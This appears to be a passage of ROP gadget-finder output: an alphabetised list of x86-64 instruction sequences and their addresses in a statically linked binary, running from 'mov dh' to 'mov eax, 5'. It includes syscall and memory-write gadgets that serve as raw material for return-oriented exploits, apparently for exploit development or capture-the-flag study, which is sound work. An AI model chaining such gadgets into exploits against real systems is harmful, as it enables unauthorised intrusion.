0x00000000004903a2 : mov dh, 0x4e ; ret 0x474c
0x00000000004383e5 : mov dh, 0x56 ; cmc ; sub eax, edx ; ret
0x00000000004383d5 : mov dh, 0x56 ; hlt ; sub eax, edx ; ret
0x00000000004383a5 : mov dh, 0x56 ; int1 ; sub eax, edx ; ret
0x0000000000456e1d : mov dh, 0x56 ; or al, 0x83 ; ret
0x0000000000456daa : mov dh, 0x56 ; or al, 0xf6 ; ret 0xf08
0x00000000004383b5 : mov dh, 0x56 ; sub eax, edx ; ret
0x000000000040568a : mov dh, 0x73 ; add dword ptr [rax - 0x77], ecx ; ret
0x0000000000464edb : mov dh, 0x87 ; adc eax, 0x89000003 ; ret 0xe8c0
0x000000000047ce28 : mov dh, 0xad ; cli ; inc dword ptr [rsi - 0x53] ; cli ; call rsi
0x0000000000461ec2 : mov dh, 0xc0 ; add rsp, 0x58 ; ret
0x00000000004763b6 : mov dh, 0xc0 ; movsxd rax, dword ptr [r12 + rax*4] ; add rax, r12 ; jmp rax
0x000000000045be24 : mov dh, 0xc0 ; movsxd rax, dword ptr [rcx + rax*4] ; add rax, rcx ; jmp rax
0x000000000045bd70 : mov dh, 0xc0 ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x000000000040c070 : mov dh, 0xc0 ; neg eax ; pop rbx ; ret
0x0000000000472d1d : mov dh, 0xc0 ; neg eax ; ret
0x000000000046f7da : mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004402a1 : mov dh, 0xc0 ; xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x000000000043a4c1 : mov dh, 0xc1 ; pop rbx ; ret
0x000000000040c852 : mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004915e4 : mov dh, 0xc7 ; ret 0xe71f
0x000000000047513f : mov dh, 0xc9 ; movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x000000000047d318 : mov dh, 0xce ; cli ; jmp qword ptr [rsi]
0x000000000041deaa : mov dh, 0xd2 ; sub eax, edx ; ret
0x000000000047d320 : mov dh, 0xd4 ; cli ; inc dword ptr [rsi - 0x2c] ; cli ; call rsi
0x000000000047de28 : mov dh, 0xd8 ; sti ; jmp qword ptr [rsi]
0x00000000004768ef : mov dh, 0xdb ; movsxd rax, dword ptr [r9 + r11*4] ; add rax, r9 ; jmp rax
0x00000000004392e9 : mov dh, 0xe ; mov byte ptr [rdi], cl ; ret
0x0000000000417fc1 : mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x000000000041e344 : mov dh, 0xe ; sub eax, ecx ; ret
0x0000000000464d75 : mov dh, 0xf9 ; dec dword ptr [rax - 0x77] ; ret
0x0000000000405cc5 : mov dh, 0xfa ; movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x000000000040a911 : mov dh, 2 ; ret
0x000000000041e341 : mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x000000000041de81 : mov dh, 7 ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x0000000000417fc4 : mov dh, 7 ; sub eax, ecx ; ret
0x000000000043a9ec : mov dh, byte ptr [rcx - 0xd] ; ret
0x0000000000478ef7 : mov dl, 0x22 ; add byte ptr [rax + 0x39], cl ; ret
0x000000000047d0cc : mov dl, 0x9f ; cli ; jmp qword ptr [rdx]
0x000000000047cecc : mov dl, 0xa9 ; cli ; inc dword ptr [rdx - 0x57] ; cli ; call rdx
0x000000000047d3c4 : mov dl, 0xd0 ; cli ; inc dword ptr [rdx - 0x30] ; cli ; call rdx
0x0000000000421850 : mov dl, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000447fa2 : mov dword ptr [r12], edx ; jmp 0x447f6f
0x000000000042a8e6 : mov dword ptr [r9 - 2], ecx ; ret
0x000000000042a8d1 : mov dword ptr [r9 - 4], ecx ; ret
0x000000000043dbc1 : mov dword ptr [rax + 0x10], ecx ; mov qword ptr [rax + 8], rdx ; ret
0x000000000045daf9 : mov dword ptr [rax + 0x10], edx ; mov qword ptr [rax + 0x40], rcx ; ret
0x000000000045db39 : mov dword ptr [rax + 0x10], esi ; mov qword ptr [rax + 0x40], rcx ; ret
0x000000000045e0c8 : mov dword ptr [rax + 0x18], edx ; mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x000000000045dafd : mov dword ptr [rax + 0x40], ecx ; ret
0x000000000045e14a : mov dword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x000000000040ddb5 : mov dword ptr [rax + 8], 0 ; ret
0x000000000043dbc5 : mov dword ptr [rax + 8], edx ; ret
0x000000000045408d : mov dword ptr [rax], 0x16 ; mov eax, edx ; ret
0x000000000041373b : mov dword ptr [rax], 0xc ; jmp 0x41370d
0x0000000000413428 : mov dword ptr [rax], 0xc ; xor eax, eax ; ret
0x0000000000461838 : mov dword ptr [rax], 2 ; xor eax, eax ; ret
0x0000000000473d97 : mov dword ptr [rax], edi ; call 0x400441
0x000000000046f99d : mov dword ptr [rax], edi ; pop rbx ; ret
0x000000000046f8ed : mov dword ptr [rax], edx ; add rsp, 8 ; ret
0x000000000046d63b : mov dword ptr [rax], edx ; pop rbx ; ret
0x0000000000477522 : mov dword ptr [rax], edx ; ret
0x000000000045e75b : mov dword ptr [rax], edx ; xor eax, eax ; ret
0x0000000000468b71 : mov dword ptr [rbp - 0xe0], ebx ; call r10
0x0000000000468171 : mov dword ptr [rbp - 0xf8], ebx ; call r10
0x0000000000448502 : mov dword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x000000000040a5c7 : mov dword ptr [rbx + 0x10], eax ; mov rax, rbx ; pop rbx ; ret
0x000000000046d52e : mov dword ptr [rbx + 0x10], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000040ad7f : mov dword ptr [rbx + 0x10], eax ; xor eax, eax ; pop rbx ; ret
0x000000000046b41e : mov dword ptr [rbx + 0x10], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046d233 : mov dword ptr [rbx + 0x18], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x0000000000472d45 : mov dword ptr [rbx + 0x18], eax ; pop rbx ; ret
0x0000000000472df9 : mov dword ptr [rbx + 0x20], eax ; pop rbx ; ret
0x000000000044a4dd : mov dword ptr [rbx + 0x40], esi ; xor eax, eax ; pop rbx ; ret
0x000000000040d7bd : mov dword ptr [rbx + 0x40], esp ; mov dword ptr [rbx], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040d431 : mov dword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x000000000040be72 : mov dword ptr [rbx + 0x70], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000045db84 : mov dword ptr [rbx + 0x74], eax ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000448517 : mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x000000000046ad02 : mov dword ptr [rbx + 8], edx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000470153 : mov dword ptr [rbx], eax ; add rsp, 0x10 ; pop rbx ; ret
0x000000000040d74c : mov dword ptr [rbx], eax ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000474969 : mov dword ptr [rbx], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000040d7c0 : mov dword ptr [rbx], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000415bb0 : mov dword ptr [rbx], eax ; xor eax, eax ; pop rbx ; ret
0x000000000040a4c5 : mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000045e0cb : mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x000000000040829e : mov dword ptr [rcx + 0x130], edx ; ret
0x0000000000400cee : mov dword ptr [rcx + rax*2], 0x72f2a30f ; ret 0xfe83
0x000000000044701c : mov dword ptr [rcx - 0x77], eax ; ret 0x8ce9
0x000000000042a8e7 : mov dword ptr [rcx - 2], ecx ; ret
0x000000000042a8d2 : mov dword ptr [rcx - 4], ecx ; ret
0x000000000042a8c1 : mov dword ptr [rcx - 8], ecx ; ret
0x000000000043bdd4 : mov dword ptr [rcx], eax ; mov eax, 0xffffffff ; jmp 0x43bda7
0x000000000043b6fa : mov dword ptr [rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x000000000040fa34 : mov dword ptr [rdi + 0x10], eax ; pop rbx ; pop rbp ; ret
0x0000000000436c7d : mov dword ptr [rdi + 0x10], ecx ; lea rax, [rdi + 0x11] ; ret
0x0000000000436cbb : mov dword ptr [rdi + 0x10], ecx ; lea rax, [rdi + 0x13] ; ret
0x0000000000436d3d : mov dword ptr [rdi + 0x10], ecx ; lea rax, [rdi + 0x17] ; ret
0x000000000043662b : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x00000000004366ad : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00000000004365ed : mov dword ptr [rdi + 0x10], ecx ; ret
0x00000000004366f0 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x0000000000436710 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00000000004366d1 : mov dword ptr [rdi + 0x10], edx ; mov word ptr [rdi + 0x18], cx ; ret
0x0000000000436da3 : mov dword ptr [rdi + 0x17], ecx ; lea rax, [rdi + 0x1a] ; ret
0x00000000004366f3 : mov dword ptr [rdi + 0x17], ecx ; ret
0x000000000040d313 : mov dword ptr [rdi + 0x18], eax ; mov qword ptr [rdi + 8], rax ; ret
0x0000000000436d85 : mov dword ptr [rdi + 0x18], ecx ; lea rax, [rdi + 0x19] ; ret
0x0000000000436dc3 : mov dword ptr [rdi + 0x18], ecx ; lea rax, [rdi + 0x1b] ; ret
0x00000000004366d5 : mov dword ptr [rdi + 0x18], ecx ; ret
0x000000000043dc0f : mov dword ptr [rdi + 0x20], edx ; mov byte ptr [rdi + 0x28], 1 ; ret
0x000000000043dc31 : mov dword ptr [rdi + 0x20], esi ; ret
0x000000000040fa31 : mov dword ptr [rdi + 0x24], ebp ; mov dword ptr [rdi + 0x10], eax ; pop rbx ; pop rbp ; ret
0x0000000000467215 : mov dword ptr [rdi + 0x300], eax ; ret
0x00000000004671e7 : mov dword ptr [rdi + 0x308], eax ; ret
0x000000000040d343 : mov dword ptr [rdi + 0x48], edx ; mov qword ptr [rdi + 8], rax ; ret
0x000000000040fa79 : mov dword ptr [rdi + 0x60], ecx ; ret
0x000000000040fb06 : mov dword ptr [rdi + 0x880], eax ; ret
0x0000000000477561 : mov dword ptr [rdi + 0x98], esi ; ret
0x0000000000436cfd : mov dword ptr [rdi + 0xe], ecx ; lea rax, [rdi + 0x15] ; ret
0x000000000043664d : mov dword ptr [rdi + 0xe], ecx ; ret
0x0000000000436c9b : mov dword ptr [rdi + 0xf], ecx ; lea rax, [rdi + 0x12] ; ret
0x0000000000436d1d : mov dword ptr [rdi + 0xf], ecx ; lea rax, [rdi + 0x16] ; ret
0x000000000043660b : mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000427a65 : mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x00000000004278a8 : mov dword ptr [rdi + 1], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000427b48 : mov dword ptr [rdi + 1], edx ; mov word ptr [rdi], cx ; ret
0x00000000004279f5 : mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x0000000000427838 : mov dword ptr [rdi + 2], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000436b67 : mov dword ptr [rdi + 3], edx ; lea rax, [rdi + 6] ; ret
0x0000000000427985 : mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x00000000004277c8 : mov dword ptr [rdi + 3], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000436537 : mov dword ptr [rdi + 3], edx ; ret
0x0000000000436b49 : mov dword ptr [rdi + 4], edx ; lea rax, [rdi + 5] ; ret
0x0000000000427758 : mov dword ptr [rdi + 4], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000436529 : mov dword ptr [rdi + 4], edx ; ret
0x0000000000436bfb : mov dword ptr [rdi + 5], edx ; lea rax, [rdi + 0xc] ; ret
0x00000000004276e8 : mov dword ptr [rdi + 5], edx ; mov qword ptr [rdi], rcx ; ret
0x000000000043659b : mov dword ptr [rdi + 5], edx ; ret
0x0000000000436c1b : mov dword ptr [rdi + 6], edx ; lea rax, [rdi + 0xd] ; ret
0x0000000000427678 : mov dword ptr [rdi + 6], edx ; mov qword ptr [rdi], rcx ; ret
0x00000000004365ab : mov dword ptr [rdi + 6], edx ; ret
0x0000000000436bb9 : mov dword ptr [rdi + 7], edx ; lea rax, [rdi + 0xa] ; ret
0x0000000000436c3b : mov dword ptr [rdi + 7], edx ; lea rax, [rdi + 0xe] ; ret
0x0000000000427608 : mov dword ptr [rdi + 7], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000436579 : mov dword ptr [rdi + 7], edx ; ret
0x000000000046f29e : mov dword ptr [rdi + 8], eax ; mov eax, 2 ; ret
0x000000000040d317 : mov dword ptr [rdi + 8], eax ; ret
0x000000000046df94 : mov dword ptr [rdi + 8], ecx ; ret
0x0000000000436bd9 : mov dword ptr [rdi + 8], edx ; lea rax, [rdi + 0xb] ; ret
0x0000000000436b9b : mov dword ptr [rdi + 8], edx ; lea rax, [rdi + 9] ; ret
0x000000000046ef54 : mov dword ptr [rdi + 8], edx ; mov eax, ecx ; adc eax, eax ; ret
0x000000000043656b : mov dword ptr [rdi + 8], edx ; ret
0x000000000043a07b : mov dword ptr [rdi + rdx - 2], ecx ; mov word ptr [rdi], cx ; ret
0x0000000000439315 : mov dword ptr [rdi + rdx - 2], ecx ; mov word ptr [rdi], si ; ret
0x000000000043a073 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], ecx ; ret
0x000000000043a1f5 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], ecx ; vzeroupper ; ret
0x0000000000439305 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x000000000043a06b : mov dword ptr [rdi + rdx - 8], ecx ; mov qword ptr [rdi], rcx ; ret
0x00000000004392f7 : mov dword ptr [rdi + rdx - 8], ecx ; mov qword ptr [rdi], rsi ; ret
0x000000000047750c : mov dword ptr [rdi + rsi*8], edx ; ret
0x0000000000421515 : mov dword ptr [rdi - 0x10], ebx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000421553 : mov dword ptr [rdi - 0x10], ebx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000046deff : mov dword ptr [rdi - 0x10], ecx ; ret
0x000000000042189c : mov dword ptr [rdi - 0xa], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004270b8 : mov dword ptr [rdi - 0xa], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421a7c : mov dword ptr [rdi - 0xb], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000427038 : mov dword ptr [rdi - 0xb], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421c6c : mov dword ptr [rdi - 0xc], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000426fb8 : mov dword ptr [rdi - 0xc], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421e3d : mov dword ptr [rdi - 0xd], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426f29 : mov dword ptr [rdi - 0xd], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000042203d : mov dword ptr [rdi - 0xe], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426e99 : mov dword ptr [rdi - 0xe], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000042223d : mov dword ptr [rdi - 0xf], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426e09 : mov dword ptr [rdi - 0xf], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000421c1d : mov dword ptr [rdi - 2], ecx ; ret
0x0000000000421a35 : mov dword ptr [rdi - 2], edx ; ret
0x0000000000421c19 : mov dword ptr [rdi - 3], edx ; mov word ptr [rdi - 2], cx ; ret
0x0000000000421ff9 : mov dword ptr [rdi - 4], ecx ; ret
0x00000000004216cf : mov dword ptr [rdi - 4], edx ; ret
0x0000000000421ff6 : mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004221f6 : mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004223f6 : mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421519 : mov dword ptr [rdi - 8], ecx ; ret
0x0000000000421557 : mov dword ptr [rdi - 8], edx ; ret
0x00000000004216cc : mov dword ptr [rdi - 9], eax ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004217c8 : mov dword ptr [rdi - 9], ecx ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000421714 : mov dword ptr [rdi - 9], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000427138 : mov dword ptr [rdi - 9], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004067c0 : mov dword ptr [rdi], eax ; jmp 0x406789
0x000000000040693f : mov dword ptr [rdi], eax ; jmp 0x406909
0x000000000046de84 : mov dword ptr [rdi], eax ; shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x000000000046df8e : mov dword ptr [rdi], eax ; shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x0000000000455eca : mov dword ptr [rdi], ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000436b35 : mov dword ptr [rdi], ecx ; lea rax, [rdi + 4] ; ret
0x0000000000436b87 : mov dword ptr [rdi], ecx ; lea rax, [rdi + 8] ; ret
0x0000000000436b14 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dh ; lea rax, [rdi + 2] ; ret
0x00000000004364f4 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dh ; ret
0x0000000000436b65 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; lea rax, [rdi + 6] ; ret
0x0000000000436535 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x0000000000436bb7 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; lea rax, [rdi + 0xa] ; ret
0x0000000000436577 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; ret
0x0000000000436bd7 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; lea rax, [rdi + 0xb] ; ret
0x0000000000436587 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; ret
0x0000000000439047 : mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x0000000000436598 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 5], rdx ; ret
0x00000000004365a8 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 6], rdx ; ret
0x00000000004365b8 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 7], rdx ; ret
0x0000000000436526 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x0000000000436568 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 8], dx ; ret
0x0000000000439053 : mov dword ptr [rdi], ecx ; mov word ptr [rsi - 2], cx ; ret
0x000000000042760c : mov dword ptr [rdi], ecx ; ret
0x000000000043a1ef : mov dword ptr [rdi], ecx ; vzeroupper ; ret
0x0000000000436b04 : mov dword ptr [rdi], edx ; lea rax, [rdi + 1] ; ret
0x0000000000436b22 : mov dword ptr [rdi], edx ; lea rax, [rdi + 3] ; ret
0x0000000000436b74 : mov dword ptr [rdi], edx ; lea rax, [rdi + 7] ; ret
0x0000000000427914 : mov dword ptr [rdi], edx ; ret
0x000000000042a8cf : mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x000000000046f126 : mov dword ptr [rdi], esi ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x000000000042a8be : mov dword ptr [rdi], esi ; mov qword ptr [r9 - 8], rcx ; ret
0x000000000042a8e3 : mov dword ptr [rdi], esi ; mov word ptr [r9 - 2], cx ; ret
0x00000000004392fc : mov dword ptr [rdi], esi ; ret
0x000000000040a645 : mov dword ptr [rdx + 0x130], edi ; pop rbx ; ret
0x0000000000436087 : mov dword ptr [rdx + 3], eax ; lea rax, [rdx + 6] ; ret
0x00000000004348b7 : mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x0000000000436069 : mov dword ptr [rdx + 4], eax ; lea rax, [rdx + 5] ; ret
0x00000000004348a9 : mov dword ptr [rdx + 4], eax ; mov rax, rdi ; ret
0x000000000043611b : mov dword ptr [rdx + 5], eax ; lea rax, [rdx + 0xc] ; ret
0x0000000000436099 : mov dword ptr [rdx + 5], eax ; lea rax, [rdx + 8] ; ret
0x00000000004348c9 : mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x000000000043613b : mov dword ptr [rdx + 6], eax ; lea rax, [rdx + 0xd] ; ret
0x00000000004360b9 : mov dword ptr [rdx + 6], eax ; lea rax, [rdx + 9] ; ret
0x00000000004348d9 : mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x00000000004360d9 : mov dword ptr [rdx + 7], eax ; lea rax, [rdx + 0xa] ; ret
0x000000000043615b : mov dword ptr [rdx + 7], eax ; lea rax, [rdx + 0xe] ; ret
0x00000000004348e9 : mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x00000000004360f9 : mov dword ptr [rdx + 8], eax ; lea rax, [rdx + 0xb] ; ret
0x0000000000435feb : mov dword ptr [rdx + 8], eax ; lea rax, [rdx + 0xf] ; ret
0x000000000043483b : mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x000000000040ea80 : mov dword ptr [rdx + 8], eax ; xor eax, eax ; ret
0x0000000000436014 : mov dword ptr [rdx], eax ; lea rax, [rdx + 1] ; ret
0x0000000000436042 : mov dword ptr [rdx], eax ; lea rax, [rdx + 3] ; ret
0x0000000000435f94 : mov dword ptr [rdx], eax ; lea rax, [rdx + 7] ; ret
0x000000000043b78a : mov dword ptr [rdx], eax ; mov eax, 0xffffffff ; ret
0x000000000046f128 : mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x000000000046f283 : mov dword ptr [rdx], eax ; mov eax, 2 ; ret
0x000000000043ba3a : mov dword ptr [rdx], eax ; mov rax, -1 ; ret
0x00000000004347e4 : mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x000000000046f97d : mov dword ptr [rdx], eax ; pop rbx ; ret
0x000000000040e9e8 : mov dword ptr [rdx], eax ; ret
0x0000000000415e6c : mov dword ptr [rdx], ebx ; mov rax, r10 ; pop rbx ; ret
0x000000000043c9c5 : mov dword ptr [rdx], edi ; pop rbx ; pop rbp ; ret
0x000000000047a43f : mov dword ptr [rip + 0x2298ab], ebx ; jne 0x47a431 ; pop rbx ; ret
0x000000000046f4b8 : mov dword ptr [rip + 0x234baa], eax ; ret
0x000000000046ad35 : mov dword ptr [rip + 0x239675], eax ; ret
0x000000000044a308 : mov dword ptr [rip + 0x2587aa], edx ; je 0x44a321 ; ret
0x000000000043eeb6 : mov dword ptr [rip + 0x261c1c], edx ; pop rbx ; ret
0x00000000004142c6 : mov dword ptr [rip + 0x28d594], eax ; ret
0x0000000000410a7c : mov dword ptr [rip + 0x290dde], eax ; ret
0x000000000040f694 : mov dword ptr [rip + 0x2921ae], eax ; ret
0x000000000040f684 : mov dword ptr [rip + 0x2921b6], eax ; ret
0x000000000040f672 : mov dword ptr [rip + 0x2921b8], edx ; ret
0x000000000040f634 : mov dword ptr [rip + 0x2921be], eax ; ret
0x000000000040f60e : mov dword ptr [rip + 0x2921cc], eax ; ret
0x000000000040f624 : mov dword ptr [rip + 0x2921d6], eax ; ret
0x000000000040f5de : mov dword ptr [rip + 0x292204], eax ; ret
0x000000000040f5bd : mov dword ptr [rip + 0x292249], eax ; ret
0x000000000040f5f3 : mov dword ptr [rip + 0x29479b], eax ; ret
0x000000000040e97b : mov dword ptr [rsi + 0x60], ebx ; add rsp, 0x10 ; pop rbx ; ret
0x0000000000439056 : mov dword ptr [rsi - 2], ecx ; ret
0x0000000000439049 : mov dword ptr [rsi - 4], ecx ; ret
0x0000000000464ab1 : mov dword ptr [rsi], 0xffffffff ; xor eax, eax ; ret
0x000000000047754e : mov dword ptr [rsi], eax ; mov rax, qword ptr [rdi + 0x98] ; ret
0x000000000046aea2 : mov dword ptr [rsi], eax ; ret
0x000000000040f812 : mov dword ptr [rsi], ecx ; ret
0x000000000046a1eb : mov dword ptr [rsi], edi ; mov rax, r8 ; pop rbx ; ret
0x000000000041236c : mov dword ptr [rsp + 0x10], ebx ; mov qword ptr [rsp + 8], rax ; call rsi
0x00000000004123ef : mov dword ptr [rsp + 0x10], edx ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000406733 : mov dword ptr [rsp + 0x20], edx ; call rax
0x00000000004123f4 : mov dword ptr [rsp + 8], eax ; call rcx
0x0000000000412371 : mov dword ptr [rsp + 8], eax ; call rsi
0x000000000040907e : mov dword ptr [rsp + 8], ecx ; mov rdi, r15 ; call rax
0x000000000040b302 : mov dword ptr [rsp], ecx ; mov rdi, rbx ; call rax
0x0000000000447fa3 : mov dword ptr [rsp], edx ; jmp 0x447f6e
0x000000000045408c : mov dword ptr fs:[rax], 0x16 ; mov eax, edx ; ret
0x000000000041373a : mov dword ptr fs:[rax], 0xc ; jmp 0x41370e
0x0000000000413427 : mov dword ptr fs:[rax], 0xc ; xor eax, eax ; ret
0x0000000000461837 : mov dword ptr fs:[rax], 2 ; xor eax, eax ; ret
0x0000000000461fec : mov dword ptr fs:[rax], edx ; xor eax, eax ; ret
0x000000000043bdd3 : mov dword ptr fs:[rcx], eax ; mov eax, 0xffffffff ; jmp 0x43bda8
0x000000000043b6f9 : mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x000000000043b789 : mov dword ptr fs:[rdx], eax ; mov eax, 0xffffffff ; ret
0x0000000000439304 : mov dword ptr ss:[rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x0000000000421a30 : mov dx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x00000000004364e0 : mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x0000000000400b5a : mov eax, 0 ; pop rbp ; ret
0x000000000043a53b : mov eax, 0x10 ; pop rbx ; ret
0x0000000000415bc0 : mov eax, 0x16 ; ret
0x000000000043a549 : mov eax, 0x20 ; pop rbx ; ret
0x000000000046fe40 : mov eax, 0x27 ; syscall ; ret
0x000000000043a542 : mov eax, 0x30 ; pop rbx ; ret
0x000000000043a557 : mov eax, 0x40 ; pop rbx ; ret
0x000000000048f4fb : mov eax, 0x45155e93 ; ret 0x591c
0x00000000004726bc : mov eax, 0x489066ff ; add esp, 8 ; ret
0x00000000004993f4 : mov eax, 0x58000054 ; cmc ; cli ; call rbx
0x0000000000447e58 : mov eax, 0x5b000000 ; pop r12 ; ret
0x000000000047219c : mov eax, 0x5b9066ff ; ret
0x000000000043a550 : mov eax, 0x60 ; pop rbx ; ret
0x0000000000461be0 : mov eax, 0x66 ; syscall ; ret
0x0000000000461c00 : mov eax, 0x68 ; syscall ; ret
0x0000000000461bf0 : mov eax, 0x6b ; syscall ; ret
0x0000000000461c10 : mov eax, 0x6c ; syscall ; ret
0x000000000043a52d : mov eax, 0x80 ; pop rbx ; ret
0x000000000047166a : mov eax, 0x89fd8945 ; ret 0xe283
0x00000000004947f4 : mov eax, 0xb8000008 ; and al, 0xf7 ; call rsp
0x00000000004981f4 : mov eax, 0xb8000042 ; push rdi ; cli ; jmp qword ptr [rdi]
0x0000000000415bd8 : mov eax, 0xc ; pop rbx ; ret
0x0000000000461640 : mov eax, 0xc9 ; syscall ; ret
0x000000000043d9f2 : mov eax, 0xca ; syscall ; pop rdx ; pop rsi ; ret
0x0000000000479a07 : mov eax, 0xd88948ff ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040f674 : mov eax, 0xf3002921 ; ret
0x000000000040bc35 : mov eax, 0xffffffff ; jmp 0x40bbf7
0x000000000043bdd6 : mov eax, 0xffffffff ; jmp 0x43bda5
0x0000000000456148 : mov eax, 0xffffffff ; mov qword ptr [rdi], rsi ; ret
0x0000000000409d71 : mov eax, 0xffffffff ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000409af7 : mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x000000000040ad93 : mov eax, 0xffffffff ; pop rbx ; ret
0x0000000000409abb : mov eax, 0xffffffff ; ret
0x000000000046f105 : mov eax, 1 ; mov qword ptr [rdi], rsi ; ret
0x000000000040dcb2 : mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043ae08 : mov eax, 1 ; pop rbx ; pop rbp ; ret
0x000000000045e05f : mov eax, 1 ; pop rbx ; ret
0x0000000000455e2f : mov eax, 1 ; ret
0x0000000000460e93 : mov eax, 2 ; ret
0x00000000004610f1 : mov eax, 3 ; ret
0x00000000004783cf : mov eax, 4 ; jne 0x4783f8 ; ret
0x0000000000461101 : mov eax, 4 ; ret
0x0000000000461111 : mov eax, 5 ; ret
